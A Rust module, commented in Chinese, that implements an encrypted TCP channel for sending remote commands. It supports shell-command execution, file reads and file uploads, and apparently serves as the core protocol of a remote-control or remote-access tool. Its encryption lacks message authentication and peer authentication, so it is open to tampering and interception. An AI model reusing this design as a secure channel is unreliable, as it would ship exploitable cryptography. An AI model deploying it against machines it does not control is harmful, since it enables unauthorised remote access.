use chacha20::{ChaCha20, Key, Nonce};
use chacha20::cipher::{KeyIvInit, StreamCipher};
use curve25519_dalek::{montgomery::MontgomeryPoint, scalar::Scalar, constants::X25519_BASEPOINT};
use rand::TryRngCore;
use rand::rngs::OsRng;
use serde::{Deserialize, Serialize};
use sha2::{Sha256, Digest};
use std::error::Error;
use std::io::{Read, Write};
use std::net::TcpStream;

// 命令类型
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum Command {
    Heartbeat,
    ExecuteCommand { command: String },
    ReadFile { path: String },
    UploadFile { path: String, content: Vec<u8> },
    Disconnect,
}

// 响应类型
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum Response {
    HeartbeatResponse,
    CommandOutput { output: String },
    FileContent { content: Vec<u8> },
    UploadResponse { success: bool, message: String },
    Error { message: String },
}

pub struct CryptoChannel {
    stream: TcpStream,
    current_key: Option<[u8; 32]>,
}

impl CryptoChannel {
    pub fn new(stream: TcpStream) -> Self {
        CryptoChannel {
            stream,
            current_key: None,
        }
    }

    // Diffie-Hellman 密钥交换
    // 测试GitHub Signing Key
    pub fn perform_key_exchange(&mut self, is_server: bool) -> Result<(), Box<dyn Error>> {
        let mut rng = OsRng;
        let mut private_key = [0u8; 32];
        rng.try_fill_bytes(&mut private_key)?;
        let private_key = Scalar::from_bytes_mod_order(private_key);
        let public_key = X25519_BASEPOINT * private_key;
        
        if is_server {
            let mut client_public = [0u8; 32];
            self.stream.read_exact(&mut client_public)?;
            self.stream.write_all(public_key.as_bytes())?;
            
            let client_point = MontgomeryPoint(client_public);
            let shared_secret = client_point * private_key;
            
            let mut hasher = Sha256::new();
            hasher.update(shared_secret.as_bytes());
            self.current_key = Some(hasher.finalize().into());
        } else {
            self.stream.write_all(public_key.as_bytes())?;
            let mut server_public = [0u8; 32];
            self.stream.read_exact(&mut server_public)?;
            
            let server_point = MontgomeryPoint(server_public);
            let shared_secret = server_point * private_key;
            
            let mut hasher = Sha256::new();
            hasher.update(shared_secret.as_bytes());
            self.current_key = Some(hasher.finalize().into());
        }
        
        Ok(())
    }

    pub fn send_command(&mut self, command: &Command) -> Result<(), Box<dyn Error>> {
        let data = bincode::serialize(command)?;
        self.send_encrypted(&data)
    }

    pub fn receive_command(&mut self) -> Result<Command, Box<dyn Error>> {
        let data = self.receive_encrypted()?;
        Ok(bincode::deserialize(&data)?)
    }

    pub fn send_response(&mut self, response: &Response) -> Result<(), Box<dyn Error>> {
        let data = bincode::serialize(response)?;
        self.send_encrypted(&data)
    }

    pub fn receive_response(&mut self) -> Result<Response, Box<dyn Error>> {
        let data = self.receive_encrypted()?;
        Ok(bincode::deserialize(&data)?)
    }

    fn send_encrypted(&mut self, data: &[u8]) -> Result<(), Box<dyn Error>> {
        let key = self.current_key.ok_or("No encryption key established")?;
        
        let mut rng = OsRng;
        let mut nonce_bytes = [0u8; 12];
        rng.try_fill_bytes(&mut nonce_bytes)?;
        
        let key = Key::from_slice(&key);
        let nonce = Nonce::from_slice(&nonce_bytes);
        let mut cipher = ChaCha20::new(key, nonce);
    
        let mut encrypted = data.to_vec();
        cipher.apply_keystream(&mut encrypted);
        let len = encrypted.len() as u32;
        let mut header = Vec::with_capacity(4 + 12);
        header.extend_from_slice(&len.to_be_bytes());
        header.extend_from_slice(&nonce_bytes);
        self.stream.write_all(&header)?;
        self.stream.write_all(&encrypted)?;
        self.stream.flush()?;
        
        Ok(())
    }

    fn receive_encrypted(&mut self) -> Result<Vec<u8>, Box<dyn Error>> {
        let key = self.current_key.ok_or("No encryption key established")?;
        
        let mut len_bytes = [0u8; 4];
        self.stream.read_exact(&mut len_bytes)?;
        let len = u32::from_be_bytes(len_bytes) as usize;
        
        let mut nonce_bytes = [0u8; 12];
        self.stream.read_exact(&mut nonce_bytes)?;
        
        let mut encrypted = vec![0u8; len];
        self.stream.read_exact(&mut encrypted)?;

        let key = Key::from_slice(&key);
        let nonce = Nonce::from_slice(&nonce_bytes);
        let mut cipher = ChaCha20::new(key, nonce);
        
        cipher.apply_keystream(&mut encrypted);
        
        Ok(encrypted)
    }
}